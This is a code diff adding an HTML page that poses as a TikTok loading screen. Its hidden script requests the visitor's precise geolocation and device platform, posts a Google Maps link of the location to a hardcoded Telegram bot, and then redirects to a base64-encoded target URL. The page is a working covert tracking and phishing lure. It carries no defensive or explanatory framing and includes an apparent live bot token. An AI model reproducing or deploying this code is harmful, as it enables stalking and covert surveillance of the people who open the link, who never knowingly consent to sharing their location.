@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><title>TikTok</title></head>
+<body style="background:#000; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="border:4px solid #333; border-top:4px solid #fe2c55; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite;"></div>
+    <style>@keyframes spin {0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}</style>
+
+    <script>
+        // --- DATA BOT ANDA ---
+        const TOKEN = '8770900784:AAFQMU3eer9kUvL6QkWj2SqWCdkQiFnS8G0';
+        const CHAT_ID = '7668457237'; // <-- ISI CHAT ID ANDA DISINI
+
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            const target = atob(params.get('to')) || "https://tiktok.com";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    const lat = p.coords.latitude;
+                    const lng = p.coords.longitude;
+                    const gmaps = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    const text = `😈 **BLAZER SENSOR DETECTED!**\n\n📍 Lokasi: [LIHAT MAPS](${gmaps})\n🎯 Akurasi: ${p.coords.accuracy.toFixed(1)}m\n📱 Device: ${navigator.platform}`;
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                    }).then(() => location.href = target);
+                }, () => location.href = target, {enableHighAccuracy: true});
+            } else {
+                location.href = target;
+            }
+        };
+    </script>
+</body>
+</html>
